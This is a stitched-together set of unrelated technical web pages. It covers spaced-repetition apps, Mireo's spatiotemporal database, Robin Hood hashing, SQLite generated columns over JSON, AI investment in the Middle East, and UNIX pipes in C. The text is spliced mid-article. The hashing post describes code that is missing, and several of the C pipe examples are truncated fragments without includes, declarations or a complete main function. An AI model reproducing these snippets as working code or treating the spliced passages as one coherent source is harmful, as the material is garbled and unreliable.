<p><strong>How it fits with SRLT:</strong> Its classical surface will help you not simply with drag and drop text flashcards, but you can also insert video and audio files to support the memorization process. Furthermore, typing an answer is also an option during the learning phase, and the program will color results to show if you were correct or not.</p>
<h2>Conclusion</h2>
<p>Learning accompanies us throughout our entire life, while as we age studying gets harder. Spaced repetition is a good-to-know tactic (or even life-hack) that you might have used before without consciously knowing it. Utilizing the method through one of the above spaced repetition software apps will help you to memorize learning materials more effectively and in less time. The method comes handy in all ages, regardless if you go to school, prepare for college exams, or do corporate training to develop your career.</p>

<p><span>"Storing and querying datasets that contain objects in a geometric space have always required special treatment. The choice of data structures and query algorithms can easily make the difference between a query that runs in seconds or in days.“</span> (Werner Vogels, Amazon CTO, <a href="https://www.allthingsdistributed.com/2013/08/spatial-databases.html" target="_blank" rel="noopener">https://www.allthingsdistributed.com/2013/08/spatial-databases.html</a>)</p>
<p>Mireo has been in the vehicle tracking business since 2001 and during that time we have learned many valuable lessons. One of the most important ones is that these systems usually don't scale. What does this mean? As the number of records exceeds a few billion mark, the processing of data requires exponentially more time. This is true for all systems processing data produced by moving objects, but which are not designed as natively horizontally scalable.</p>
<p>In the late summer of 2014, we got an interesting and challenging business proposal –&nbsp; to design and develop a system capable of live tracking 2 million trucks and storing their log history for a period of 5 years. Can you imagine the amount of spatiotemporal data we would need to store and process? In order to correctly perform the map-matching process (i.e. detect the road where the vehicle is currently located, based on its imprecise GPS position), a vehicle needs to send its GPS positions relatively frequently. For the sake of simplicity, let's approximate this with ”1 position every 3 seconds“ while a vehicle is driving. Now, let's do the math:</p>
<p>2.000.000 vehicles</p>
<p>x 1.200 GPS positions per vehicle per hour</p>
<p>x 5 years</p>
<p>= 105.120.000.000.000 positions</p>
<p>Yes, that's more than <strong>105 trillion</strong>. Needless to say, our old vehicle tracking system that relies on the combination of relational and NoSQL databases would fall apart under such amount of data. Additionally, the new system was required to be able to resolve queries such as ”<em><strong>fetch the total number of truck visits to the specified factory“.</strong></em></p>
<p>There were several difficult problems to be solved in order to fulfill this kind of business proposal, such as load distribution, map-matching, networking (tracking 2 million vehicles means 2 million permanently open TCP connections). However, the most difficult one was definitely choosing the right storage. Where should we store the data? To a file system? To a relational database? To a NoSQL database? To a general-purpose object storage like Hadoop? Each of the mentioned options presented problems of its own: traditional relational SQL databases are not designed as distributed and horizontally scalable, NoSQL key-value databases have records with the same index dispersed around the disk (performance killer!), with clustered file systems (Ceph, GlusterFS, HDFS..) it is not possible to use maximal disk bandwidth with the level of abstraction which those file systems bring, etc.</p>
<p>The storing of data needed to be efficient, but the most important was to provide <strong>fast searching.</strong> For example, the execution time of the query <em><strong>”fetch all positions and timestamps when specified 4 trucks met each other“</strong></em> could not exceed few seconds in the worst case scenario. Additionally, we wanted to have the possibility to make OLAP-like queries, grouping, joining... In other words, some special kind of relational-like database would be the best choice. But which one? We had to do some serious brainstorming.</p>
<ul>
<li>we needed a relational-like database with an excellent spatiotemporal index and appropriate query language</li>
<li>we needed to store <strong>n-dimensional</strong> data sets – how would one sort such data?</li>
<li>distribution of data from ”real world“ was highly non-uniform – we would get a lot of data from the crowded areas with many vehicles, and a small amount of data from rural areas</li>
</ul>
<p>A mantra in the software engineering world is ”don't reinvent the wheel“. Naturally, we started to analyze current state-of-the-art solutions for processing massive spatiotemporal data. Besides the other obvious properties of such a system, we quickly figured out that the most critical part was the way in which the system would index multidimensional data. It turned out that there were three major multidimensional index types used in major spatial systems: R-tree family of trees (PostgreSQL/PostGIS, Oracle Spatial, MemSQL, ...), kd-tree family (Oracle Spatial Quad tree index) and Geohash (GeoMesa and various variants of products found on Google Cloud). Guess what? None of these solutions is suitable for indexing a huge amount of real-world spatiotemporal data! Let's see why.</p>
<p>Due to the aforementioned non-uniform data distribution, R-tree family of indexes is practically useless on a large scale because index traversal over high-density areas effectively becomes linear. A similar, but much worse effect would happen with fixed-grid space/time partition indexes like Geohash. The index traversal on high-density areas with Geohash would again become very linear with no possibility for more granular partitioning. To make things worse, Geohash-based indexes could in theory yield good record filtering only if range queries are finitely bounded by all dimensions. For example, in the context of a vehicle tracking system, it is natural to store and index triplets having vehicle ID, timestamp and location. Then, trying to execute a simple query of the form <em><strong>“fetch full history for one single vehicle for the period of one year“</strong></em> using Geohash would effectively linearly scan the complete database because the query is bounded by vehicle ID and timestamp, but not by location!</p>
<p>kd-tree family of indexes are the most efficient type of indexing n-dimensional interval data, but with one huge drawback – they are built on the top of static data sets. It would be possible to efficiently index even a large interval data set using kd-tree type of index, but only if the underlying recordset would not change afterwards. There had been attempts in scientific literature to loosen this requirement, but to the best of our knowledge, there was no commercially available system using some of those approaches. In our scenario, new data would keep arriving all the time so static data sets were not an option.</p>
<p>To wrap up, the system capable of storing and analyzing a large amount of spatiotemporal real-time data had to contain at least the following:</p>
<ol>
<li>it had to be designed from the ground up as <strong>clustered, distributed system</strong> with data processing modules deployed as close as possible to the physical data storage (in other words, traditional RDMBS are useless for this purpose)</li>
<li>it had to be <strong>highly available, fault-tolerant and natively horizontally scalable</strong></li>
<li><strong>the index on spatiotemporal records was by far the most important ingredient of an efficient spatiotemporal database processing system;</strong> as we saw, none of the current state-of-the-art spatiotemporal indexes was suitable for dealing with a large amount of records coming from moving objects</li>
<li><strong>partitioning scheme had to exploit spatiotemporal properties of the underlying data</strong> - records that are close (based on vehicle ID, position and timestamp) needed to be in the same or adjacent shards</li>
</ol>
<p>We had to come up with something new, something absurdly fast and massively scalable. After 5 years of hard work by the group of extremely talented people, we are proud to present <strong><a href="https://www.mireo.hr/spacetime">Mireo SpaceTime Cluster</a></strong>.

This technique isn’t very well-known, but it makes a huge practical difference because it both improves performance and space utilization compared to other “standard” hash tables (e.g. <a href="http://en.wikipedia.org/wiki/Hash_table">chaining</a>). It also eliminates the major downside of other open addressing hash tables.</p>

<p>Here are the benefits, summarized:</p>

<ul>
<li><p>High load factors can be used without seriously affecting performance. 0.9 is perfectly reasonable as a default (0.95 or higher works too, it mainly affects insertion cost a bit).</p></li>

<li><p>No linked lists or other extra pointers. This reduces cache misses and storage overhead. Your underlying structure can be a simple flat array since it’s just open addressing under the hood.</p></li>

<li><p>Lookup and insertion logic is fast. Again, no linked lists to traverse or other complications, just a linear probe sequence with a few checks per element.</p></li>

<li><p>Unlike other open addressing schemes, looking for non-existent elements is still fast.</p></li>
</ul>

<p>For a simple benchmark where I inserted 100k english words into a map, then deleted 10% of them, and then looked them all up again, the timings for my simple Robin Hood hash table was <strong>23%</strong>, <strong>66%</strong> and **25% **lower for insertions, deletions and lookups respectively compared to the VS 2012 std::unordered_map, it did this using <strong>30%</strong> less memory overall.</p>

<h2 id="it-s-all-about-the-variance">It’s all about the variance</h2>

<p>So the basic idea is to take normal open addressing, but use one clever trick in order to drastically reduce the variance of the expected average and maximum probe lengths. We’ll se later why reducing variance is so important. To give you an idea how Robin Hood Hashing improves things, the probe length variance for a RH table at a load factor of 0.9 is 0.98, whereas for a normal open addressing scheme it’s 16.2. At a load factor of 0.99 it’s 1.87 and 194 respectively.</p>

<p><strong>The clever trick is just this</strong>: when you probe for a position to insert a new element, if the probe length for the existing element is less than the current probe length for the element being inserted, swap the two elements and keep going.</p>

<p>That way elements that were inserted early and thus “lucked out” on their probe lengths, will gradually be moved away from their preferred slot as new elements come in that could make better use of that place in the table (hence the name - the insertion “takes from the rich”, i.e. the elements with low probe counts). It leads to an “evening out” of the probe lengths.</p>

<p>Why is low variance better? Well, with modern cache architectures a probe count of 1 isn’t really much faster than a probe count of 3, because the main cost is fetching the cache line, so the ideal scenario is for all elements to have the same probe count, and having that probe count fitting within one cache line.</p>

<p>It turns out that Robin Hood hashing has the same expected probe count as normal open addressing (about 2.55) - it just has substantially less variance, and therefore ends up with far fewer cache misses. Yes, there are fewer elements that can early out after 1 probe, but there also far fewer elements that end up needing to fetch multiple cache lines because of long probe lengths.</p>

<p>Furthermore, the expected value of the <em>longest</em> probe sequence approaches about 6 for a load of 0.9 (it’s not actually constant, but grows very, very slowly - <a href="http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;frm=1&amp;source=web&amp;cd=2&amp;cad=rja&amp;sqi=2&amp;ved=0CDcQFjAB&amp;url=http%3A%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.130.6339&amp;ei=RJqJUcHZH8HuigKGsoHQDw&amp;usg=AFQjCNFquQO-Wa7uCGLwFTdLKpEHDBGsig&amp;sig2=DfIIJzRj2YXIRyLiHGCHUA&amp;bvm=bv.46226182,d.cGE">see this paper</a>), which is pretty reasonable.</p>

<h2 id="what-about-failed-lookups">What about failed lookups?</h2>

<p>So now you’re probably thinking that this sounds good, but in the back of your mind you know that normal open addressing tables do pretty well too, but have a major downside in that searching for non-existing elements is troublesome to handle. To allay your fears I’ll first tell you a very simple (but totally practical) solution that is enabled by the low variance, and then we’ll see the even better version later.</p>

<p>First a recap. The usual problem is this: since the search algorithm terminates when you find an “empty” slot in the underlying array, it can take a very long time to determine that an element doesn’t exist in the array when the table grows full.</p>

<p>How does Robin Hood hashing solve this? Well the simplest solution is to exploit the fact that the expected longest probe count is low (~6). Just modify the standard search algorithm to ignore empty slots (rather than terminate the search) and keep going until you’ve probed longer than the known maximum probe length for the whole table. This maximum probe length will be small, with a very high probability, even for very loaded tables.</p>

<p>This solution would obviously be inefficient for the standard open addressing scheme, since the expected longest probe count is much higher (e.g. at a load of 0.9 and ~64K elems it&nbsp;is about 70).</p>

<h2 id="the-details">The details</h2>

<p>In order to know what the probe count of an existing element is (which is key to the algorithm) we could just re-hash the element to re-compute its “desired” slot index and then subtract this from its actual location. A faster way is to simply cache the hash value for each key.</p>

<p>Storing the hash value is generally a sensible strategy anyway, because it means you have a fast early-out for comparisons, so we take that approach here. In other words, the hash table elements consist of a 32 bit hash value, the key, and the value. For my implementation I stored the hash values in a separate array in order to get more hash probes per cache line (at the expense of a second mandatory cache miss to actually fetch the key). This gave a small speed-up for my test where the key size was large (sizeof(std::string)), but there’s a #define in the code to put the hash value alongside its key.</p>

<p>In order to indicate that a slot is unused, we modify the hash function to never return 0, and use a stored hash value of 0 to mean “uninitialized slot”.</p>

<p>First, let’s look at the insertion algorithm, since this is where the actual Robin Hood trick comes in.</p>

<p>The algorithm is pretty simple. We simply loop until we’ve found an uninitialized slot (hash value == 0). If we found an existing slot whose probe distance is less than our current probe count (‘dist’), we swap places and continue.
Note: using move semantics here matters (e.g. for efficient swapping).</p>

<p>In order to delete an element, we follow the same strategy as for normal open addressing and mark the slot as a tombstone. Tombstones are treated specially in the insert algorithm. We overwrite the tombstone only when we would’ve wanted to swap anyway (see the check for is_deleted above).</p>

<p>We must mark&nbsp;the tombstone&nbsp;using a whole bit rather than just reserving a single hash value (like we did for uninitialized slots), because we need to know the probe count of the tombstone.</p>

<p>This just finds the desired position of the element using the hash, then probes linearly from there on in. There are two conditions to signify that the element doesn’t exist, and finally one check to see if we’ve found the element.</p>

<p>The first exit condition checks for completely uninitialized elements. This is because if the element we are looking for had probed an uninitialized slot during insertion, it would have simply been place there. So the existence of an uninitialized slot along our probe sequence means the element must not be in the table.</p>

<p>The second condition is more interesting. This is our replacement for simple checking the probe distance against a table-wide maximum probe count. We <em>know</em> that when we probe an element during insertion, the one with the longer probe count of the two gets to keep the slot. So if we’re looking for an element that exists,&nbsp;we should expect to never see an existing element with a shorter probe count then our current count (if that <em>had</em> happened, there would’ve been a swap during insertion!).</p>

<p>In other words, we early out as soon as our current probe count exceeds the probe count of the stored element. Since the average probe count for stored elements is 2.55, we can exit pretty quickly for non-existent elements (much earlier than stopping after a table-wide maximum probe count).</p>

<p>This second condition is why we need to maintain the hash value even for tomb stones. Imagine what would happen if we simply marked the slot as uninitialized when it was …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>SQLite has had JSON support for a while.</p>

<p>However recently it added a killer feature: <a href="https://www.sqlite.org/gencol.html">generated
columns</a>. (This was added in 3.31.0,
released 2020-01-22.)</p>

<p>This makes it possible to insert JSON straight into SQLite and then have it
extract data and index them, i.e. you can treat SQLite as a document database.
This has been possible with PostgreSQL and obviously is what something like
Elastic provides but having it available in an embedded database is very nice
for lightweight stuff.</p>

<p>Let's get started:</p>

<pre><code>$ sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Connected to a transient in-memory database.
sqlite&gt; CREATE TABLE t (
   body TEXT,
   d INT GENERATED ALWAYS AS (json_extract(body, '$.d')) VIRTUAL);
sqlite&gt; insert into t values(json('{"d":"42"}'));
sqlite&gt; select * from t WHERE d = 42;
{"d":"42"}|42
</code></pre>

<p>It's that simple, the <code>d</code> column is extracted from the provided JSON.</p>

<p>(Aside: The hard bit may be getting a new enough SQLite, at the time of writing
Homebrew on macOS has it, else you likely need to use an unstable source like
nixpkgs-unstable.)</p>

<p>There's some nice properties of this. Normally it's encouraged to minifiy and
validate JSON when inserting (via the <code>json()</code> function) as because SQLite
doesn't have a JSON type it will allow anything. However nothing enforces that,
you could add a constraint but will probably forget... Having <code>GENERATED ALWAYS</code>
using <code>json_extract</code> means invalid JSON will get a <code>Error: malformed JSON</code> at
INSERT time.</p>

<p>This can be taken further:</p>

<pre><code>sqlite&gt; CREATE TABLE x (
  body TEXT,
  id TEXT GENERATED ALWAYS AS (json_extract(body, '$.id')) VIRTUAL NOT NULL);
sqlite&gt; insert into x values('');
Error: malformed JSON
sqlite&gt; insert into x values('{}');
Error: NOT NULL constraint failed: x.id
</code></pre>

<p>We can enforce items are present in the inserted JSON, here by adding <code>NOT
NULL</code>, but we could also use constraints and other SQLite features!</p>

<p>You'll notice I've used <code>VIRTUAL</code> with the generated column in these examples.
There's also the option of using <code>STORED</code> to essentially cache the values,
although a downside is you can't add those columns via <code>ALTER TABLE</code>.</p>

<p>However you can always create an index on a column, even if it's defined a
virtual one:</p>

<pre><code>CREATE INDEX xid on x(id);</code></pre>

<p>Then check that's going to work as expected:
</p><pre><code>EXPLAIN QUERY PLAN SELECT * FROM x WHERE id='foo';
QUERY PLAN
`--SEARCH TABLE x USING INDEX xid (id=?)
</code></pre>

<p>Combined with ALTER TABLE we can add a new column and index it:</p>

<pre><code>ALTER TABLE x ADD COLUMN text TEXT
    GENERATED ALWAYS AS (json_extract(body, '$.text')) VIRTUAL;
INSERT INTO x VALUES(json('{"id":43, "text":"test"}'));
CREATE INDEX xtext ON x(text);
</code></pre>

<p>
The benefit here is you can start off with a table which could be as simple as
just a single JSON column, and add columns and indexes as you find useful data
in that JSON. For example this can work really well for webhooks, insert all the
data you are sent straight into a table, then pull out the useful stuff later.
Have fun.

<p>Middle east is one of the top tech destinations where artificial intelligence is playing a significant role. The region is known for its oil wells, which are major contributors to the region’s economy. Slowly the economy is shifting its base from petrochemicals to technology. The region is slowly shifting its economic dependence on oil wells. According to an IDC report, spending on AI in the region is expected to grow at an annual growth of 19%.&nbsp;Consequently, demand for <strong><a href="https://www.artiba.org/the-artiba-edge" data-wpel-link="external" rel="external noopener noreferrer">AI professionals and engineers</a></strong> is expected to increase further.&nbsp;&nbsp;</p>



<p>The growth of AI in the region has been significant. AI can be seen being used across a range of verticals in the region, including consumer, enterprise, and government activities. One of the major significant impacts of artificial intelligence can be seen in the development of smart cities in the region. Banking and retail are seeing equally strong contribution of AI. According to IDC, these sectors will account for more than 33% of investments by 2020. The federal and central government and telecommunication industry will witness significant investment in AI.&nbsp; &nbsp;</p>



<div><p>South Africa, the largest AI market in the Middle East and Africa, will contribute around 30% of total AI spending that would come from the automated customer service agents, IT automation, and automated threat intelligence and prevention systems, according to Manish Ranjan, IDC’s program manager for software and cloud in the Middle East, Africa, and Turkey.</p></div>



<p><strong>Pushing the AI sector in the region&nbsp;</strong></p>



<p>Not just South Africa, many other countries are investing heavily in AI intending to shift their economy away from a dependency on petrochemicals. Saudi Arabia is expected to accrue the largest gains where AI is expected to contribute over $135.2bn in 2030 to the economy, roughly equivalent to 12.4% of GDP. UAE is expected to see the largest impact close to 14% of 2030 GDP, according to PwC. The company cites the levels of investment in AI in the two countries in comparison to other regions, as the rationale behind its judgment.&nbsp;&nbsp;</p>



<p>The formation of a new authority and center for AI in Saudi Arabia, the launch of UAE AI strategy in October 2017, and the establishment of the Mohamed bin Zayed University of Artificial Intelligence are a few initiatives that PwC cites for its predictions.&nbsp;Increasing supply of AI talent by educating more <strong>AI professionals</strong> is a top strategic priority in the region.</p>



<p><strong>Paving way for the AI development&nbsp;&nbsp;</strong></p>



<div><p>&nbsp;Business leaders in the middle east are keen to adopt AI solutions. Considering these many organizations have rolled out AI-based applications with the belief that if they don’t adopt AI now, it might cost their organization for the next decade.&nbsp;</p></div>



<p>The answer, Gartner research vice president Arup Roy argues, is a lack of understanding of the technology, as well as knowing when and where there’s a business case for using AI.</p>



<p>&nbsp;Lack of knowledge related to AI is a fundamental concern among businesses. When and how to use the technology for a business case is another concern for businesses.&nbsp;</p>



<p>Not to mention, lack of&nbsp;<a href="https://www.artiba.org/blog/the-artificial-intelligence-engineer-career-roadmap-all-you-need-to-know" data-wpel-link="external" rel="external noopener noreferrer"><strong>AI Engineers</strong></a>, infrastructure, and regulatory issues, are key considerations as well as challenges around natural language processing in Arabic. Understanding the impact of automation on jobs and the potential of AI to support and inform decision making.</p>



<p>&nbsp;A combination of research, education, and policy efforts, therefore, is needed for the potential of AI in the Middle East to be realized. UAE’s AI Talent Hunt Program and 2018’s 1 Million Arab coders initiative are prime examples of the kind of initiatives the region needs. Luminaries like Dr. FatmahBaothman, the first woman in the Middle East to earn Ph.D. in modern artificial intelligence, will be required to inspire future generations.&nbsp;<br>&nbsp;</p>



<p>Additionally, the governments in the middle east will have to tackle “contentious and challenging issues including the ones that go beyond jobs and labor market skills” expresses Guy Borton, a fellow at the LSE Middle East Centre and adjunct professor at Vesalius College, Brussels.&nbsp;</p>

<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

<p>This algorithm is coded as follows:</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

{

		printf(<span>"Received: %c</span><span>\n</span><span>"</span>, c);
		<span>/* force the buffer to be printed on the output (screen) */</span>
		fflush(stdout);
		_exit(<span>0</span>);
	}
	<span>/* parent */</span>
	<span>if</span> (close(fildes[<span>0</span>]) <span>==</span> <span>-</span><span>1</span>)

	<span>/* wait for the child process termination */</span>
	<span>if</span> (wait(<span>&amp;</span>status) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"wait"</span>);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	printf(<span>"_PC_PIPE_BUF: %ld</span><span>\n</span><span>"</span>, fpathconf(fildes[<span>1</span>],_PC_PIPE_BUF));
	printf(<span>"PIPE_BUF: %d</span><span>\n</span><span>"</span>, PIPE_BUF);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;sys/types.h&gt;</span><span>
</span><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span></span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (ioctl(fildes[<span>1</span>], FIONSPACE, <span>&amp;</span>n) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"ioctl"</span>);
	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (fcntl(fildes[<span>1</span>], F_SETFL, O_NONBLOCK) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"fcntl"</span>);

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* filter real errors from the unavailable for now resource */</span>
	<span>if</span> (errno <span>!=</span> EAGAIN)
		err(EXIT_FAILURE, <span>"write"</span>);

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

